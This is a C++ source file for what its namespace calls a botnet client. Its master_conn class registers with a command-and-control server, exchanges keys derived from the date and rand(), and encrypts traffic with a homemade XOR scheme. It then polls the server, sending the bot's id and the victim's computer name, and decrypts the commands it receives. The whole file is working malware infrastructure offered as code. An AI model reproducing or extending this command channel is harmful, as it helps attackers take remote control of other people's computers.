#include <iostream>
#include <windows.h>
#include <cmath>
#include <vector>

#include "master_conn.h"
#include "http_client.h"
#include "http_request.h"
#include "define.h"
#include "utils.h"
#include "base64.h"

namespace botnet{
    master_conn::master_conn() {
        typedef botnet::http::http_request http_request;
        typedef botnet::http::http_client http_client;
        std::string content;
        std::string confirm_srv;
        std::vector<std::string> arr;
        count_conn = 1;
        char* alex = "alex";

        std::string host = HOST + ':' + std::to_string(PORT);

        http_request *http_req = new http_request(botnet::http::GET);
        http_request::headers header;
        header.add("Host", host);
        client_key = keyGen();
        confirm_msg = rand();
        std::string path = "?k_c=" + std::to_string(client_key) +
            "&confirm=" + std::to_string(confirm_msg);

        http_req->setPath(path);
        http_req->setHeaders(header);

        http_client *http_c = new http_client(HOST, PORT);
        http_c->request(http_req);

        content = http_c->getContent();

        arr = split(content, "\n");

        if (arr.size() < 3)
            return;

        client_id = base64_decode(arr[1]);

        hash_key = combineKeys(std::atoi(base64_decode(arr[2]).c_str()));

        confirm_srv = arr[3];

        // Delete the last char because node put a \r in the end
        confirm_srv = confirm_srv.substr(0, confirm_srv.length() - 1);

        bool b = confirm(base64_decode(confirm_srv));
    }

    int master_conn::keyGen() {
        SYSTEMTIME lt;
        int day = 0;
        int base = 0;
        int r = 0;
        int key;

        GetLocalTime(&lt);
        day = lt.wDay;
        base = (day + 1) * (day + 2) * (day + 3) * (day + 13);
        r = (int) (INT_MAX / 2 + floor(rand() * INT_MAX / 2));
        key = base ^ r;
        my_rand = r;
        return key;
    }


	std::string master_conn::expand_key (std::string str_key){

        std::string enc1 = base64_encode(reinterpret_cast<const unsigned char*>(
            str_key.c_str()), str_key.length());

        std::string enc2 = base64_encode(reinterpret_cast<const unsigned char*>(
            enc1.c_str()), enc1.length());

        std::string enc3 = base64_encode(reinterpret_cast<const unsigned char*>(
            enc2.c_str()), enc2.length());

        std::string enc4 = base64_encode(reinterpret_cast<const unsigned char*>(
            enc3.c_str()), enc3.length());

        std::string enc5 = base64_encode(reinterpret_cast<const unsigned char*>(
            enc4.c_str()), enc4.length());

        return enc5;
	}

	std::string master_conn::combineKeys(int keyServer){
        return expand_key(std::to_string(keyServer ^ my_rand));
	}

	std::string master_conn::encrypt(std::string m){
		int i;
		int j = 0;
		std::string c = "";
        int iv = count_conn;
        std::string k = hash_key; /* this.hash_key */;
		for (i = 0; i < m.length(); i++){
	    	c += ((char)(iv ^ m[i] ^ k[j]));
			j = (j + 1) % k.length();
			if (j == 0)
				iv = (iv + 1) % 256;
		}
		return c;
	}


    bool master_conn::confirm(std::string msg_from_server){
		return encrypt(std::to_string(confirm_msg)) == msg_from_server;
	}

	std::string master_conn::decrypt (std::string c){
		int j = 0;
		int i;
		std::string m = "";
        int iv = count_conn; /* this.count numero de conexoes */;
        std::string k = hash_key; /* this.expanded_private_key*/;
		for (i = 0; i < c.length(); i++){
			m += (iv ^ c[i] ^ k[j]);
            j = (j + 1) % k.length();
	        if (j == 0)
	        	iv = (iv + 1) % 256;
		}

		return m;
	}

    std::vector<std::string> master_conn::ask_for_cmd() {
        typedef botnet::http::http_request http_request;
        typedef botnet::http::http_client http_client;

        std::vector<std::string> arr;

        std::string host = HOST + ':' + std::to_string(PORT);
        std::string content;

        http_request *http_req = new http_request(botnet::http::GET);
        http_request::headers header;
        header.add("Host", host);
        count_conn++;

        std::string path = "?id=" + client_id;
        path += "&compname=" + getComputerName();

        http_req->setPath(path);
        http_req->setHeaders(header);

        http_client *http_c = new http_client(HOST, PORT);
        http_c->request(http_req);

        content = http_c->getContent();

        arr = split(content, "\n");

        for (int i = 0; i < arr.size(); i++) {
            arr[i] = decrypt(base64_decode(arr[i]));
        }

        return arr;
    }



}
